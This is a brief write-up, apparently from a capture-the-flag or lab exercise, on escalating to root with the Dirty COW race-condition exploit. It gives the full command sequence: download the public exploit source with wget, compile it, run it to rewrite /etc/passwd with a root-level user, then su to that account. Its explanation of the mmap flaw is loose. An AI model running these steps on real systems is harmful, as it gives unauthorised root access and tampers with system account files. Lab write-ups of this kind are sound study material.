# writeup4

## dirtycow

The dirtycow exploit allows us to get root access by abusing the `mmap` function. The exploit is available [here](https://github.com/firefart/dirtycow/blob/master/dirty.c).

This is due to a race condition in the `mmap` function. The exploit works by writing to a file that is being mapped to memory. The `mmap` function will then map the file to memory and the write will be reflected in the memory. This allows us to write to a file that we don't have write access to.

We can use the following command to get root access:

```sh
$ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -O dirtycow.c
$ gcc dirtycow.c -lpthread -lcrypt -o dirtycow
$ ./dirtycow
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
```
Wait a bit, and we will be able to log as `firefart` with the password of our choice.

```sh
$ su firefart
Password:
$ id
uid=0(firefart) gid=0(root) groups=0(root)
```